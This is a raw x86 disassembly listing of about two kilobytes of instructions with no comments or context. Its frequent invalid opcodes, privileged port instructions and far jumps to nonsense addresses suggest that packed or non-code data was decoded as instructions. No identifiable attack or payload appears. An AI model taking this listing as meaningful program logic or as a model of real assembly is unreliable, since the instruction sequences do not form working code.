  41a4bd:	retf   
  41a4be:	cld    
  41a4bf:	ins    BYTE PTR es:[edi],dx
  41a4c0:	popa   
  41a4c1:	retf   0x2647
  41a4c4:	stc    
  41a4c5:	cmp    ebp,esi
  41a4c7:	mov    esp,0xb5160db4
  41a4cc:	cmp    BYTE PTR [eax-0x2ce174dc],dl
  41a4d2:	test   al,0xf3
  41a4d4:	stos   BYTE PTR es:[edi],al
  41a4d5:	aas    
  41a4d6:	push   es
  41a4d7:	stc    
  41a4d8:	push   es
  41a4d9:	xlat   BYTE PTR ds:[ebx]
  41a4da:	clc    
  41a4db:	sub    edx,DWORD PTR [esi-0x4c]
  41a4de:	jnp    0x41a4db
  41a4e0:	sub    DWORD PTR cs:[ebx+ebp*1+0x5e],edi
  41a4e5:	shr    BYTE PTR [ecx+ecx*1+0x40],1
  41a4e9:	out    dx,eax
  41a4ea:	mov    eax,DWORD PTR ds:0x421159de
  41a4f0:	cli    
  41a4f1:	stc    
  41a4f2:	jo     0x41a540
  41a4f4:	xchg   esp,eax
  41a4f5:	and    al,0xa6
  41a4f7:	fucomip st,st(3)
  41a4f9:	or     bh,bl
  41a4fb:	in     eax,dx
  41a4fc:	dec    esp
  41a4fd:	mov    cl,0x82
  41a4ff:	cli    
  41a500:	push   eax
  41a501:	lea    ebp,[ebx-0x79]
  41a504:	mov    al,0xf8
  41a506:	std    
  41a507:	(bad)  
  41a508:	jg     0xca2f40a
  41a50e:	int    0xd8
  41a510:	cld    
  41a511:	dec    esp
  41a512:	sbb    bl,BYTE PTR [edi-0x13]
  41a515:	ret    0x3132
  41a518:	or     DWORD PTR [ecx+edx*1+0x12a2b445],0xb5f1cdc3
  41a523:	xchg   ebx,eax
  41a524:	(bad)  
  41a525:	imul   esi,DWORD PTR [edx-0x3399c6cf],0x13
  41a52c:	les    esi,FWORD PTR [ecx]
  41a52e:	inc    eax
  41a52f:	jmp    0x41a4f8
  41a531:	shl    BYTE PTR [ebp+0x39],0x55
  41a535:	pop    ss
  41a536:	call   0x2d73253b
  41a53b:	xchg   ebx,eax
  41a53c:	and    al,bl
  41a53e:	jl     0x41a5ab
  41a540:	(bad)  
  41a541:	popf   
  41a542:	xchg   edx,eax
  41a543:	cs jne 0x41a557
  41a546:	outs   dx,DWORD PTR ds:[esi]
  41a547:	jae    0x41a526
  41a549:	js     0x41a599
  41a54b:	or     BYTE PTR gs:[edx+ebp*1],al
  41a54f:	xchg   ebp,eax
  41a550:	int3   
  41a551:	dec    ecx
  41a552:	aad    0x81
  41a554:	adc    al,0x8d
  41a556:	scas   al,BYTE PTR es:[edi]
  41a557:	popa   
  41a558:	inc    edx
  41a559:	in     al,0x27
  41a55b:	jo     0x41a4f5
  41a55d:	xchg   edx,eax
  41a55e:	xchg   DWORD PTR [ecx+0x59294757],esi
  41a564:	imul   esp,DWORD PTR [esi],0xd8296d7d
  41a56a:	scas   eax,DWORD PTR es:[edi]
  41a56b:	adc    ecx,DWORD PTR [edi]
  41a56d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a56e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a56f:	dec    edx
  41a570:	push   ds
  41a571:	mov    cl,ah
  41a573:	loopne 0x41a5f1
  41a575:	aam    0x9
  41a577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a578:	pushf  
  41a579:	push   ebp
  41a57a:	test   al,0x32
  41a57c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a57d:	or     bl,BYTE PTR [ecx+ebx*1-0x7467085e]
  41a584:	xor    bh,BYTE PTR [esi]
  41a586:	jns    0x41a598
  41a588:	mov    eax,0xfa37568a
  41a58d:	cmp    DWORD PTR [esi],0xffffffc9
  41a590:	push   ebp
  41a591:	add    dh,0xe5
  41a594:	mov    edi,0xbe5cb7d2
  41a599:	adc    BYTE PTR [eax-0x50],cl
  41a59c:	add    ecx,DWORD PTR [edx]
  41a59e:	xchg   DWORD PTR [edx],eax
  41a5a0:	mov    WORD PTR cs:[ebp+0x16b0504f],cs
  41a5a7:	shl    BYTE PTR [eax],cl
  41a5a9:	popf   
  41a5aa:	cdq    
  41a5ab:	call   0xa1f9:0x73b886b0
  41a5b2:	call   0x6df88aa4
  41a5b7:	test   BYTE PTR [eax],dl
  41a5b9:	adc    cl,BYTE PTR [esi]
  41a5bb:	jg     0x41a634
  41a5bd:	cmp    al,0xac
  41a5bf:	cmp    eax,0x428f4a7c
  41a5c4:	arpl   WORD PTR ds:0xfbe70456,dx
  41a5ca:	sbb    BYTE PTR [ecx+0x36],dl
  41a5cd:	xchg   edx,eax
  41a5ce:	fs dec ebx
  41a5d0:	sbb    bh,ah
  41a5d2:	sub    al,0x62
  41a5d4:	pop    edi
  41a5d5:	sub    DWORD PTR [ebx+0x3e476924],0x7de85ab8
  41a5df:	cmp    BYTE PTR [esi+0x30],bh
  41a5e2:	adc    DWORD PTR [edx-0xfd535f],edx
  41a5e8:	shr    BYTE PTR [ecx-0x1b],0x42
  41a5ec:	sbb    ch,BYTE PTR [ecx+0x20c3ce50]
  41a5f2:	sbb    eax,0xa6239060
  41a5f7:	mov    ah,ch
  41a5f9:	push   ebx
  41a5fa:	xor    al,0xb6
  41a5fc:	pusha  
  41a5fd:	in     al,dx
  41a5fe:	and    BYTE PTR [eax-0x49],ch
  41a601:	(bad)  
  41a602:	(bad)  [esp+ebp*1]
  41a605:	xchg   esi,eax
  41a606:	adc    cl,0xf8
  41a609:	sub    eax,0x71899d10
  41a60e:	fidiv  WORD PTR [ebp-0x6a830237]
  41a614:	inc    esi
  41a615:	retf   0xe503
  41a618:	cwde   
  41a619:	jb     0x41a67c
  41a61b:	mov    DWORD PTR ds:0xcfb5e8aa,ebp
  41a621:	ins    DWORD PTR es:[edi],dx
  41a622:	sbb    bl,BYTE PTR [ebp+0x51]
  41a625:	stos   BYTE PTR es:[edi],al
  41a626:	cmc    
  41a627:	dec    esp
  41a628:	xor    DWORD PTR [eax-0x4595ae25],0x2f
  41a62f:	push   ss
  41a630:	call   0x6157:0xbf82adc1
  41a637:	jno    0x41a687
  41a639:	mov    dh,0x3a
  41a63b:	or     edx,esi
  41a63d:	out    dx,al
  41a63e:	pop    esi
  41a63f:	dec    ebx
  41a640:	fldcw  WORD PTR [ebp+0x7e]
  41a643:	pushf  
  41a644:	(bad)  
  41a645:	push   ebx
  41a646:	int    0xe4
  41a648:	imul   edi,ebp,0x34e4f561
  41a64e:	pop    ds
  41a64f:	bound  eax,QWORD PTR [eax]
  41a651:	jne    0x41a63e
  41a653:	pop    esi
  41a654:	fldenv [ebx+0x6]
  41a657:	push   ds
  41a658:	cmp    al,0xdc
  41a65a:	popa   
  41a65b:	mov    DWORD PTR [edi],ebp
  41a65d:	int3   
  41a65e:	shr    dh,0xed
  41a661:	sub    al,bh
  41a663:	push   edi
  41a664:	inc    esp
  41a665:	jne    0x41a61d
  41a667:	aad    0xcc
  41a669:	(bad)  
  41a66a:	shrd   DWORD PTR [edi-0x19a5a97b],ebp,0x5e
  41a672:	mov    BYTE PTR [esi+eax*2+0x3d335177],0x4
  41a67a:	dec    ebx
  41a67b:	inc    ebp
  41a67c:	sub    al,0x7d
  41a67e:	cmc    
  41a67f:	lods   al,BYTE PTR ds:[esi]
  41a680:	in     al,0x5f
  41a682:	xchg   DWORD PTR [eax],esp
  41a684:	dec    ebp
  41a685:	addr16 mov bh,bl
  41a688:	sub    ecx,DWORD PTR [esi]
  41a68a:	push   eax
  41a68b:	inc    esi
  41a68c:	stc    
  41a68d:	xchg   ecx,eax
  41a68e:	push   es
  41a68f:	call   0x935979b5
  41a694:	pop    ebx
  41a695:	pushf  
  41a696:	aaa    
  41a697:	shr    DWORD PTR [ebp+0x52],1
  41a69a:	or     esi,DWORD PTR [eax-0x5ea1a011]
  41a6a0:	push   cs
  41a6a1:	xlat   BYTE PTR ds:[ebx]
  41a6a2:	cwde   
  41a6a3:	(bad)  
  41a6a4:	mov    ch,0xc2
  41a6a6:	sbb    eax,DWORD PTR [ecx+0x4e505686]
  41a6ac:	inc    edx
  41a6ad:	lock push es
  41a6af:	mov    al,BYTE PTR [edi+0x2ac129b1]
  41a6b5:	das    
  41a6b6:	call   DWORD PTR [ebx-0x338ac357]
  41a6bc:	push   es
  41a6bd:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41a6bf:	or     esi,DWORD PTR [eax-0x1c32c49d]
  41a6c5:	jbe    0x41a6d9
  41a6c7:	out    dx,eax
  41a6c8:	mov    cl,0x47
  41a6ca:	bound  esp,QWORD PTR [ebx+0x4348a0a6]
  41a6d0:	dec    esi
  41a6d1:	mov    ah,0x33
  41a6d3:	fs mov al,0xbf
  41a6d6:	sub    DWORD PTR [ebx-0x1fa23bca],0x26
  41a6dd:	mov    ecx,0x607e9985
  41a6e2:	jecxz  0x41a6c1
  41a6e4:	cmp    al,BYTE PTR [ebp+0x71e78520]
  41a6ea:	test   ebp,esi
  41a6ec:	clc    
  41a6ed:	mov    al,ds:0xbef57c0f
  41a6f2:	mov    edx,0xe68ed29c
  41a6f7:	test   DWORD PTR [eax+ebx*4],eax
  41a6fa:	popa   
  41a6fb:	ja     0x41a6f3
  41a6fd:	out    0xe8,eax
  41a6ff:	test   DWORD PTR [esi-0x3342d716],eax
  41a705:	cli    
  41a706:	jmp    0xdaa9bc12
  41a70b:	push   esi
  41a70c:	sub    eax,0x12b963c1
  41a711:	push   0x4c
  41a713:	imul   ebp,DWORD PTR [edx-0x2e],0xaed3b0df
  41a71a:	out    0xfb,eax
  41a71c:	sbb    al,cl
  41a71e:	push   esp
  41a71f:	sbb    dl,BYTE PTR [ebp+0x34c3e4da]
  41a725:	in     al,0x6a
  41a727:	cli    
  41a728:	scas   al,BYTE PTR es:[edi]
  41a729:	adc    bh,BYTE PTR [ebp-0x7038f335]
  41a72f:	jmp    0x41a6cd
  41a731:	pop    esp
  41a732:	push   edx
  41a733:	sti    
  41a734:	repz das 
  41a736:	dec    eax
  41a737:	xchg   esi,eax
  41a738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a739:	mov    edx,0x67de6a12
  41a73e:	xchg   ecx,eax
  41a73f:	mov    edi,0xe2dbbc7b
  41a744:	inc    edx
  41a745:	mov    DWORD PTR [ebx+0x10],esp
  41a748:	mov    bh,0xe
  41a74a:	(bad)  
  41a74b:	aam    0x1f
  41a74d:	xchg   DWORD PTR [edi+edx*4+0x59],edx
  41a751:	and    DWORD PTR [edi+0x69fece2e],ecx
  41a757:	xchg   edx,eax
  41a758:	adc    al,0x30
  41a75a:	jne    0x41a74a
  41a75c:	lock fwait
  41a75e:	jbe    0x41a72e
  41a760:	cmp    al,0xf6
  41a762:	pop    ebx
  41a763:	sahf   
  41a764:	jecxz  0x41a7c5
  41a766:	xchg   ecx,eax
  41a767:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a768:	add    esi,DWORD PTR [ebx]
  41a76a:	adc    al,0x2f
  41a76c:	rol    DWORD PTR [ebx+0x3a],0xaf
  41a770:	dec    edi
  41a772:	jmp    0x53ac5eff
  41a777:	xor    edx,DWORD PTR [eax-0x39]
  41a77a:	jmp    0xdc1e:0x79ba4143
  41a781:	jmp    0x4227:0x6a215162
  41a788:	gs in  al,0x51
  41a78b:	or     ch,BYTE PTR [eax+0x65c6be8]
  41a791:	pop    esi
  41a792:	bound  esp,QWORD PTR [ebx+0x70c73111]
  41a798:	dec    edx
  41a799:	pop    esp
  41a79a:	in     al,0x30
  41a79c:	sub    DWORD PTR [ecx-0x7d45d74],ebp
  41a7a2:	mov    ebp,0xfce808fb
  41a7a7:	mov    eax,0x842c13f
  41a7ac:	xor    eax,0x8efb35e5
  41a7b1:	pop    edx
  41a7b2:	add    DWORD PTR [eax],esp
  41a7b4:	inc    ecx
  41a7b5:	adc    al,0x1a
  41a7b7:	sbb    bh,dh
  41a7b9:	jo     0x41a772
  41a7bb:	jp     0x41a7cb
  41a7bd:	dec    ebx
  41a7be:	inc    edi
  41a7bf:	scas   al,BYTE PTR es:[edi]
  41a7c0:	mov    ah,0x2b
  41a7c2:	xchg   BYTE PTR [ecx+eiz*8-0x4d],dl
  41a7c6:	dec    ebx
  41a7c7:	jmp    0xef6:0xe6b15199
  41a7ce:	push   0x68
  41a7d0:	iret   
  41a7d1:	fadd   st,st(3)
  41a7d3:	ret    0xe116
  41a7d6:	rol    DWORD PTR [eax+0x1b],1
  41a7d9:	rcr    DWORD PTR [edx],1
  41a7db:	cs out 0xe7,al
  41a7de:	or     DWORD PTR [ebp-0x3b],0xffffff86
  41a7e2:	push   ss
  41a7e3:	push   edx
  41a7e4:	and    eax,0x29194b79
  41a7e9:	add    cl,al
  41a7eb:	aam    0xb5
  41a7ed:	std    
  41a7ee:	outs   dx,DWORD PTR ds:[esi]
  41a7ef:	xchg   ecx,eax
  41a7f0:	retf   0x5659
  41a7f3:	jl     0x41a7e5
  41a7f5:	dec    edi
  41a7f6:	dec    ebp
  41a7f7:	adc    BYTE PTR [ebx],ch
  41a7f9:	(bad)  
  41a7fa:	cmp    dh,BYTE PTR [ecx+0x77058709]
  41a800:	(bad)  
  41a802:	cs popa 
  41a804:	addr16 push ebp
  41a806:	add    edx,DWORD PTR [ebx+0x6b]
  41a809:	mov    DWORD PTR [edx],esi
  41a80b:	ins    BYTE PTR es:[edi],dx
  41a80c:	stos   DWORD PTR es:[edi],eax
  41a80d:	xlat   BYTE PTR ds:[ebx]
  41a80e:	add    edx,ecx
  41a810:	fisub  WORD PTR [edx]
  41a812:	xchg   edi,eax
  41a813:	rol    BYTE PTR [esi+0x67],1
  41a816:	ret    
  41a817:	push   ebp
  41a818:	inc    edi
  41a819:	sar    DWORD PTR [esi-0x1af2cff],cl
  41a81f:	inc    ecx
  41a820:	ja     0x41a7a6
  41a822:	cmp    DWORD PTR [eax+0x31],eax
  41a825:	mov    edi,0xe5d9eea5
  41a82a:	mov    bh,0x11
  41a82c:	in     eax,0xd6
  41a82e:	xchg   BYTE PTR [edx-0x48a6ab32],dl
  41a834:	xchg   DWORD PTR [ebp+ebp*1-0x1cc6bbbe],esi
  41a83b:	repnz xor al,0xd7
  41a83e:	(bad)  
  41a83f:	jne    0x41a7f4
  41a841:	shl    eax,cl
  41a843:	add    dh,al
  41a845:	add    BYTE PTR [eax+edi*4+0x9],bl
  41a849:	xor    bl,BYTE PTR [ebx-0x3a]
  41a84c:	push   edx
  41a84d:	push   ebp
  41a84e:	xchg   esi,eax
  41a84f:	mov    al,0xf2
  41a851:	adc    BYTE PTR [ebx+0x408bc74f],al
  41a857:	lea    esi,[edi+0x3a]
  41a85a:	inc    esi
  41a85b:	in     al,dx
  41a85c:	aam    0x90
  41a85e:	test   al,0xe6
  41a860:	jecxz  0x41a8b5
  41a862:	adc    ecx,DWORD PTR [ebp+0x47]
  41a865:	scas   al,BYTE PTR es:[edi]
  41a866:	mov    ecx,0x54248ffd
  41a86b:	mov    esi,0xa5dc7c8c
  41a870:	ja     0x41a81d
  41a872:	inc    edx
  41a873:	sahf   
  41a874:	call   0xc04c2157
  41a879:	lea    edi,[ebx+eax*8+0x14998556]
  41a880:	mov    esi,0xcc6efc72
  41a885:	int3   
  41a886:	data16 ror ah,1
  41a889:	add    ch,bl
  41a88b:	shl    BYTE PTR [ecx],0x88
  41a88e:	xor    BYTE PTR [esi-0xa],ch
  41a891:	and    BYTE PTR [edx],0xee
  41a894:	lea    edx,[eax+0x12]
  41a897:	std    
  41a898:	adc    eax,DWORD PTR [ebx+0x5532cdeb]
  41a89e:	shr    BYTE PTR [esi-0x53],0xfc
  41a8a2:	sbb    esi,edi
  41a8a4:	sti    
  41a8a5:	call   0x729c:0xc47b5a44
  41a8ac:	call   0xa480:0x132d7f76
  41a8b3:	in     al,0xf9
  41a8b5:	clc    
  41a8b6:	dec    esi
  41a8b7:	sbb    eax,0x3475782d
  41a8bc:	test   DWORD PTR [edx+0x44ebd56],edx
  41a8c2:	xor    al,0xac
  41a8c4:	ins    BYTE PTR es:[edi],dx
  41a8c5:	sbb    DWORD PTR [ebx+edi*8],esi
  41a8c8:	or     ah,al
  41a8ca:	popf   
  41a8cb:	push   0xffffffd0
  41a8cd:	pop    edx
  41a8ce:	mov    ecx,0x1d1282b4
  41a8d3:	xchg   edx,eax
  41a8d4:	jl     0x41a924
  41a8d6:	mov    cs,WORD PTR [edi-0x13815741]
  41a8dc:	mov    bh,0x22
  41a8de:	lods   al,BYTE PTR ds:[esi]
  41a8df:	mov    ?,WORD PTR ds:[ebx-0x2189c7a2]
  41a8e6:	xor    dl,ch
  41a8e8:	aaa    
  41a8e9:	jmp    0xed7d:0x8526e7c5
  41a8f0:	out    dx,al
  41a8f1:	mov    dl,BYTE PTR [edx]
  41a8f3:	push   cs
  41a8f4:	adc    ebx,edx
  41a8f6:	ins    BYTE PTR es:[edi],dx
  41a8f7:	sbb    al,BYTE PTR [ebp-0x14]
  41a8fa:	dec    ebp
  41a8fb:	or     eax,0x80ec803
  41a900:	xor    ch,0x9d
  41a903:	xchg   ebp,eax
  41a904:	and    eax,0x831a8f64
  41a909:	rol    DWORD PTR [edx+0x76],0xc1
  41a90d:	nop
  41a90e:	pusha  
  41a90f:	and    ch,BYTE PTR [edi+0x1c0cfc56]
  41a915:	inc    ebx
  41a916:	or     DWORD PTR [ecx-0x12],0x42
  41a91a:	rep lods eax,DWORD PTR ds:[esi]
  41a91c:	inc    eax
  41a91d:	add    esi,DWORD PTR [eax+ecx*8]
  41a920:	jne    0x41a8db
  41a922:	(bad)  
  41a923:	fisub  DWORD PTR [eax]
  41a925:	jo     0x41a92e
  41a927:	mov    BYTE PTR [edi-0x21],dh
  41a92a:	fist   WORD PTR [esi-0x243cd835]
  41a930:	not    DWORD PTR [esi-0x5a6ba07c]
  41a936:	call   0x54340ab0
  41a93b:	mov    esp,0xfc5d345a
  41a940:	or     DWORD PTR [ebx+0x7a],0x8f65497f
  41a947:	add    ah,dh
  41a949:	sahf   
  41a94a:	fiadd  WORD PTR [edx+0xe5ac128]
  41a950:	push   ecx
  41a951:	bswap  esi
  41a953:	popa   
  41a954:	xor    ebp,DWORD PTR [esi+0x3e]
  41a957:	(bad)  
  41a958:	int3   
  41a959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a95a:	or     BYTE PTR [ebp+0x2b4d836b],al
  41a960:	(bad)  
  41a961:	jmp    0xf3a6f873
  41a966:	xlat   BYTE PTR ds:[ebx]
  41a967:	cmp    BYTE PTR [esi+0x3bd61bcb],dl
  41a96d:	xor    al,0x42
  41a96f:	sub    ch,ch
  41a971:	shl    DWORD PTR [esi],1
  41a973:	pop    ebp
  41a974:	mov    edi,0xc576448b
  41a979:	cmp    eax,0xd91d630f
  41a97e:	stos   BYTE PTR es:[edi],al
  41a97f:	mov    es,WORD PTR [ecx+0x7d33bbfd]
  41a985:	inc    BYTE PTR [eax-0x3154ac12]
  41a98b:	hlt    
  41a98c:	mov    edx,0x8656282d
  41a991:	push   ebp
  41a992:	sahf   
  41a993:	jo     0x41a9ba
  41a995:	and    WORD PTR [ebp+0x1af64000],si
  41a99c:	inc    edx
  41a99d:	iret   
  41a99e:	jecxz  0x41a99e
  41a9a0:	pop    es
  41a9a1:	fxch   st(3)
  41a9a3:	mov    edx,0xdaa083e
  41a9a8:	cmc    
  41a9a9:	and    dh,dh
  41a9ab:	out    dx,eax
  41a9ac:	mov    al,0xda
  41a9ae:	ror    BYTE PTR [edx],1
  41a9b0:	test   al,0x49
  41a9b2:	ja     0x41a9e6
  41a9b4:	(bad)  
  41a9b5:	xchg   ebp,eax
  41a9b6:	push   ss
  41a9b7:	pop    edi
  41a9b8:	jmp    0x58aad223
  41a9bd:	arpl   WORD PTR [ecx-0x31d83b27],bp
  41a9c3:	mov    eax,ds:0xdbfdbc49
  41a9c8:	pop    edx
  41a9c9:	xor    eax,0x20e1d883
  41a9ce:	pop    ecx
  41a9cf:	icebp  
  41a9d0:	push   ss
  41a9d1:	(bad)  
  41a9d2:	push   edi
  41a9d3:	ficom  DWORD PTR [edi+0x5c30e545]
  41a9d9:	shl    DWORD PTR [esi],1
  41a9db:	xchg   BYTE PTR [esi+0x18],ch
  41a9de:	jmp    0x41a991
  41a9e0:	imul   esi,ebx,0xd5511528
  41a9e6:	(bad)  
  41a9e7:	or     al,0xc7
  41a9e9:	mov    ah,0xac
  41a9eb:	jae    0x41aa16
  41a9ed:	mov    cl,0x46
  41a9ef:	es inc esi
  41a9f1:	(bad)  
  41a9f2:	fwait
  41a9f3:	shl    esp,0xbb
  41a9f6:	sub    ebx,ebp
  41a9f8:	call   0x5daacd50
  41a9fd:	shl    DWORD PTR [eax-0xf4517c9],cl
  41aa03:	das    
  41aa04:	xor    BYTE PTR [ecx+0x2102379f],ch
  41aa0a:	sbb    al,0x80
  41aa0c:	int    0x92
  41aa0e:	xchg   esp,eax
  41aa0f:	sbb    bl,BYTE PTR [eax+eiz*1]
  41aa12:	popa   
  41aa13:	ja     0x41a9cf
  41aa15:	outs   dx,DWORD PTR ds:[esi]
  41aa16:	or     esp,DWORD PTR [eax]
  41aa18:	aad    0x73
  41aa1a:	mov    ds:0x6fb5cf78,eax
  41aa1f:	int    0xfc
  41aa21:	sub    al,0x88
  41aa23:	dec    ebp
  41aa24:	adc    edi,DWORD PTR [esi-0x7f]
  41aa27:	add    DWORD PTR ds:0xa148b44b,esi
  41aa2d:	pop    edi
  41aa2e:	or     ah,BYTE PTR [esp+ecx*8-0xc2dcc0d]
  41aa35:	or     BYTE PTR ds:0xc43662bc,ch
  41aa3b:	jno    0x41a9f0
  41aa3d:	into   
  41aa3e:	xchg   cl,dh
  41aa40:	fist   DWORD PTR [eax-0x699badd7]
  41aa46:	test   BYTE PTR [ebx-0x2],dl
  41aa49:	jbe    0x41aab4
  41aa4b:	(bad)  
  41aa4c:	mov    ds:0x411bc81e,eax
  41aa51:	test   al,0xfe
  41aa53:	push   edx
  41aa54:	sub    DWORD PTR [ecx],esi
  41aa56:	mov    ds:0x5aa6eee1,eax
  41aa5b:	outs   dx,DWORD PTR ds:[esi]
  41aa5c:	sbb    eax,0xdb7f8179
  41aa61:	fnsave [esi]
  41aa63:	inc    eax
  41aa64:	lahf   
  41aa65:	gs int3 
  41aa67:	sbb    DWORD PTR [ebx],edi
  41aa69:	ins    BYTE PTR es:[edi],dx
  41aa6a:	sbb    bh,ah
  41aa6c:	fcom   DWORD PTR [ecx+ecx*4+0x2d3de2bd]
  41aa73:	jl     0x41aa18
  41aa75:	cwde   
  41aa76:	fistp  WORD PTR [ebp+0xe50d650]
  41aa7c:	pop    edi
  41aa7d:	pusha  
  41aa7e:	inc    ecx
  41aa7f:	jmp    0x55b0fbd3
  41aa84:	or     eax,0x354a11a1
  41aa89:	mov    edi,0xe4dba5b7
  41aa8e:	sub    al,bh
  41aa90:	jno    0x41aa3e
  41aa92:	mov    al,ds:0x5a2c0ef6
  41aa97:	clc    
  41aa98:	jns    0x41ab02
  41aa9a:	sub    al,0x2b
  41aa9c:	inc    ecx
  41aa9d:	mov    dl,0x30
  41aa9f:	inc    ebx
  41aaa0:	cmp    esi,DWORD PTR [edi+0x73]
  41aaa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaa4:	mov    edi,0xacbb76a0
  41aaa9:	sbb    bh,BYTE PTR [esi-0x62]
  41aaac:	pop    es
  41aaad:	sbb    al,0x42
  41aaaf:	clc    
  41aab0:	mov    DWORD PTR [eax+ebp*1-0x75],edx
  41aab4:	retf   
  41aab5:	in     eax,0x9
  41aab7:	cmc    
  41aab8:	rcr    BYTE PTR [eax-0xc],1
  41aabb:	pop    edi
  41aabc:	sbb    BYTE PTR ds:0xf4c0d289,cl
  41aac2:	rcr    BYTE PTR [edi],0x8f
  41aac5:	add    al,0xa3
  41aac7:	fisubr WORD PTR ds:0xb7c6dd21
  41aacd:	(bad)  
  41aace:	mov    ecx,DWORD PTR [esi-0x3b42dc4e]
  41aad4:	ficom  DWORD PTR [ecx+0x35]
  41aad7:	jg     0x41aaaf
  41aad9:	adc    dh,BYTE PTR es:[ebp+0x53c977a9]
  41aae0:	les    ecx,FWORD PTR [eax]
  41aae2:	xchg   ebx,eax
  41aae3:	or     al,0x19
  41aae5:	jae    0x41aacc
  41aae7:	adc    eax,0x7a82126f
  41aaec:	xchg   DWORD PTR [ecx+0x3886125c],ecx
  41aaf2:	adc    al,0xc1
  41aaf4:	sub    eax,DWORD PTR [edx+0x8ee1dce]
  41aafa:	dec    ebx
  41aafb:	or     eax,DWORD PTR [ecx+0x6257efec]
  41ab01:	pop    ebx
  41ab02:	sub    ch,BYTE PTR [ecx-0x7c]
  41ab05:	std    
  41ab06:	xchg   ebp,eax
  41ab07:	push   0x484abfa4
  41ab0c:	scas   al,BYTE PTR es:[edi]
  41ab0d:	out    0xfc,al
  41ab0f:	ja     0x41ab27
  41ab11:	push   edx
  41ab12:	popa   
  41ab13:	mov    eax,0x5d45a186
  41ab18:	adc    ecx,DWORD PTR [ebp-0x7a66406b]
  41ab1e:	iret   
  41ab1f:	hlt    
  41ab20:	loopne 0x41ab55
  41ab22:	das    
  41ab23:	mov    edx,0x5b4559c
  41ab28:	sbb    eax,0xb7673460
  41ab2d:	jmp    0x41ab2e
  41ab2f:	aas    
  41ab30:	std    
  41ab31:	dec    esi
  41ab32:	push   ds
  41ab33:	in     eax,0x81
  41ab35:	jae    0x41ab3a
  41ab37:	inc    ebp
  41ab38:	add    cl,BYTE PTR [ebx+0x5c2c1091]
  41ab3e:	loop   0x41aaf4
  41ab40:	pop    esp
  41ab41:	sbb    DWORD PTR [eax+0x21],esi
  41ab44:	or     al,BYTE PTR [edi+0x5d]
  41ab47:	out    0x5,al
  41ab49:	lock (bad) 
  41ab4b:	repz fcmovnu st,st(2)
  41ab4e:	bound  esi,QWORD PTR [esi+0x33]
  41ab51:	aad    0x88
  41ab53:	in     eax,dx
  41ab54:	push   esi
  41ab55:	retf   
  41ab56:	sbb    bl,BYTE PTR [edx+0x2a1d90f2]
  41ab5c:	out    0xaa,eax
  41ab5e:	jl     0x41ab57
  41ab60:	push   ebp
  41ab61:	sar    BYTE PTR [eax-0x5a3bd73],0x21
  41ab68:	add    ebx,DWORD PTR [eax-0x4c306a09]
  41ab6e:	stos   BYTE PTR es:[edi],al
  41ab6f:	sbb    eax,0x94e61ea9
  41ab74:	pushf  
  41ab75:	int3   
  41ab76:	(bad)  
  41ab77:	(bad)  
  41ab78:	xchg   ebx,eax
  41ab79:	inc    ecx
  41ab7a:	je     0x41ab45
  41ab7c:	hlt    
  41ab7d:	imul   BYTE PTR [ecx]
  41ab7f:	stc    
  41ab80:	add    dh,dl
  41ab82:	pop    ebx
  41ab83:	cmc    
  41ab84:	sbb    BYTE PTR [esi+edx*2-0x65],dh
  41ab88:	dec    ecx
  41ab89:	push   edx
  41ab8a:	sub    bl,BYTE PTR [ecx-0x6f]
  41ab8d:	xchg   ebp,eax
  41ab8e:	or     BYTE PTR [edx],dl
  41ab90:	sub    eax,0x22b8dfd4
  41ab95:	aas    
  41ab96:	iret   
  41ab97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab98:	les    ebx,FWORD PTR [ebp+0x2150ab9a]
  41ab9e:	mov    edi,0x1dbe6cc3
  41aba3:	aas    
  41aba4:	push   0x2141a0a4
  41aba9:	cmp    DWORD PTR [esi+0x77],esi
  41abac:	pop    esi
  41abad:	add    ch,bl
  41abaf:	inc    edx
  41abb0:	push   es
  41abb1:	push   edx
  41abb2:	rol    DWORD PTR [edi+0x75d7bdba],1
  41abb8:	lahf   
  41abb9:	aad    0x2
  41abbb:	and    ebx,ebx
  41abbd:	fisttp QWORD PTR [edi+0x21]
  41abc0:	outs   dx,BYTE PTR ds:[esi]
  41abc1:	out    dx,eax
  41abc2:	jne    0x41abfa
  41abc4:	sti    
  41abc5:	mov    DWORD PTR [edx+0x602eba1a],ecx
  41abcb:	push   eax
  41abcc:	ror    DWORD PTR [esi],0x81
  41abcf:	lods   eax,DWORD PTR ds:[esi]
  41abd0:	pusha  
  41abd1:	fld    DWORD PTR [edx+0x5b]
  41abd4:	inc    edi
  41abd5:	in     al,0xf9
  41abd7:	popf   
  41abd8:	xchg   esi,eax
  41abd9:	outs   dx,DWORD PTR ds:[esi]
  41abda:	out    dx,al
  41abdb:	pop    edx
  41abdc:	and    esp,edi
  41abde:	in     al,0xf9
  41abe0:	call   0x7ba925e9
  41abe5:	and    BYTE PTR [edx-0x75],dl
  41abe8:	mov    bl,0xc5
  41abea:	push   0x6070affa
  41abef:	sbb    cl,BYTE PTR [edx-0x1576b9ac]
  41abf5:	jno    0x41ac18
  41abf7:	mov    BYTE PTR [ecx+0x72],cl
  41abfa:	add    eax,eax
  41abfc:	ins    DWORD PTR es:[edi],dx
  41abfd:	jae    0x41ac61
  41abff:	mov    ds:0xffa91e79,al
  41ac04:	xchg   bh,ch
  41ac06:	scas   al,BYTE PTR es:[edi]
  41ac07:	mov    edi,0xad2da4bf
  41ac0c:	(bad)  
  41ac0d:	xor    eax,0xa059e667
  41ac12:	mov    al,ds:0x548cab8
  41ac17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac18:	ret    
  41ac19:	pop    esp
  41ac1a:	call   0xfd9fbe1c
  41ac1f:	xchg   ebp,eax
  41ac20:	fist   DWORD PTR [ebp-0x46]
  41ac23:	imul   DWORD PTR [esi-0x58]
  41ac26:	adc    ebp,eax
  41ac28:	cmp    eax,DWORD PTR [ecx]
  41ac2a:	cld    
  41ac2b:	test   BYTE PTR [edx+0x9c1e38b],ah
  41ac31:	sbb    al,BYTE PTR [ecx+0x27]
